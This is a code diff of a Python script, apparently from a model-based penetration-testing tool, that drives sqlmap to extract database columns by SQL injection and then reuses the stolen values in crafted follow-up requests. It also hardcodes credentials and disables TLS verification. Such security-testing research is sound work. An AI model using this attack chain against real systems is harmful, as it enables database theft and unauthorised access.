@@ -33,6 +33,7 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
     method = None
     params = None
     mapping = None
+    abstract_param_to_real = None
     
     # specific for executing sqlmap
     data_to_extract = []
@@ -51,37 +52,46 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
                  url, method, params, data_to_extract = parser.request_details(idx,msc_table, file_aslanpp, extension_sqli)
                  if not data_to_extract:
                      cprint("No valid data to be extracred from the database","WARNING")
-                 # for the execution we need (url,method,params,data_to_extract)
-                 # data_to_extract => table.column
-                 sqlmap_output = execute_sqlmap(url,method,params,data_to_extract)
-                 cprint(sqlmap_output,"DEBUG")
-                 if not sqlmap_output:
-                     cprint("No data extracted from the database","WARNING")
-                     exit()
+                 else:
+                    # for the execution we need (url,method,params,data_to_extract)
+                    # data_to_extract => table.column
+                    sqlmap_output = execute_sqlmap(url,method,params,data_to_extract)
+                    cprint(sqlmap_output,"DEBUG")
+                    if not sqlmap_output:
+                        cprint("No data extracted from the database","WARNING")
+                        exit()
              elif "e" in extension_sqli[idx][0]:
                  # exploit the sqli here, which is also a normal request where we use
                  # the result from sqlmap
                  cprint("exploit sqli here, crafted request","DEBUG")
-                 url, method, params, mapping = parser.request_details(idx,msc_table, file_aslanpp)
+                 url, method, params, abstract_param_to_real, mapping = parser.request_details(idx,msc_table, file_aslanpp)
                  # for each p in params we need to instantiate it, either with the constant
                  # present in the annotation or with something from sqlmap_output
                  req_params = {}
+                 cprint("mapping","DEBUG")
                  cprint(mapping,"DEBUG")
+                 cprint("Abstract param to real","DEBUG")
+                 cprint(abstract_param_to_real,"DEBUG")
+                 cprint("Params","DEBUG")
+                 cprint(params,"DEBUG")
                  for p in params:
                      p_key = p[0]
                      p_value = p[1]
                      if p_value == "?":
-                         # it means we need to provide some value
-                         for mapping_key,mapping_value in mapping.items():
-                             tblcol = mapping_value.replace(" ","").split(".")
-                             candidate_values = sqlmap_output[tblcol[0]][tblcol[1]]
-                             cprint(candidate_values,"DEBUG")
-                             req_params[p_key] = candidate_values[0]
+                         cprint(p_key + " " + p_value,"DEBUG")
+                         for abstract_key,abstract_value in abstract_param_to_real.items():
+                             if abstract_value == p_key:
+                                 tblcol = mapping[abstract_key].split(".")
+                                 #tblcol = mapping_value.replace(" ","").split(".")
+                                 candidate_values = sqlmap_output[tblcol[0]][tblcol[1]]
+                                 cprint("Candidate value","DEBUG")
+                                 cprint(candidate_values,"DEBUG")
+                                 req_params[p_key] = candidate_values[0]
                      else:
                          # we leave the param with the default value
                          req_params[p_key] = p_value
                  cprint(req_params,"DEBUG")
-                 execute_request(url,method,params)
+                 execute_request(url,method,req_params)
              elif "n" in extension_sqli[idx][0]:
                  # normal http request
                  cprint(msc_table[idx][0],"DEBUG")
@@ -96,14 +106,18 @@ def execute_attack(msc_table,extension_sqli,file_aslanpp):
 
 def execute_request(url, method, params):
     global s
+    cprint("Execute request", "DEBUG")
+    cprint(url,"DEBUG")
+    cprint(method,"DEBUG")
+    cprint(params,"DEBUG")
     #url = 'https://157.27.244.25/chained'
     headers = {'user-agent': 'my-app/0.0.1'}
-    #proxy = {"http" : "http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
+    proxy = {"http" : "http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
     r = None
     if method == "GET":
-        r = s.get(url,params=params, verify=False, auth=('regis','password'))
+        r = s.get(url,proxies=proxy,params=params, verify=False, auth=('regis','password'))
     else:
-        r = s.post(url, data = params, verify=False, auth=('regis','password'))
+        r = s.post(url,proxies=proxy, data = params, verify=False, auth=('regis','password'))
     #r = requests.get(url, headers=headers, proxies=proxy, verify=False, auth=('regis','password'))
     print(r.text)
 
